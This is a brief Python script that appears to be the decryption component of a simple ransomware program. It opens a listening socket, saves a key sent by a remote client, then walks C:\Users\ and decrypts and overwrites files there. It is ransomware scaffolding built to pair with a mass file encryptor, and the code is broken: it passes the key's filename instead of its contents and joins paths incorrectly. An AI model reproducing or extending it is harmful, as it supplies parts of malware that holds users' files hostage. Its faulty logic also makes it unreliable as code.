import socket
import os
import sys
from cryptography.fernet import Fernet


def Main():
	
	host = '0.0.0.0'
	port = 10000
	
	s = socket.socket()
	s.bind((host, port))
	print("started listening")
	s.listen(1)

	c, addr = s.accept()
	print("connection from: " + addr[0])
	filename = 'key.key'
	file = open(filename, "wb")
	while True:
		data = c.recv(1024)
		if not data:
			break
		file.write(data)
	print("from connected user: " + filename)
	file.close()
	c.close()

def decrypt_all_dir(root_dir, key):
        for dirName, subDirList, fileList in os.walk(root_dir):
                for file in fileList:
                        print(os.path.join(root_dir, file))
                        try:
                                o = open(os.path.join(root_dir, file), 'rb')
                        except PermissionError:
                                continue
                        except FileNotFoundError:
                                continue
                        o = open(os.path.join(root_dir, file), 'rb')
                        data = o.read()
                        o.close()
                        fernet = Fernet(key)
                        decrypted = fernet.decrypt(data)

                        try:
                                o = open(os.path.join(root_dir, file), 'wb')
                        except PermissionError:
                                continue
                        except FileNotFoundError:
                                continue
                        o = open(os.path.join(root_dir, file), 'wb')
                        o.write(decrypted)
                        o.close()

if __name__ == '__main__':
	Main()
	target_dir = "C:\\Users\\"
	decrypt_all_dir(target_dir, 'key.key')

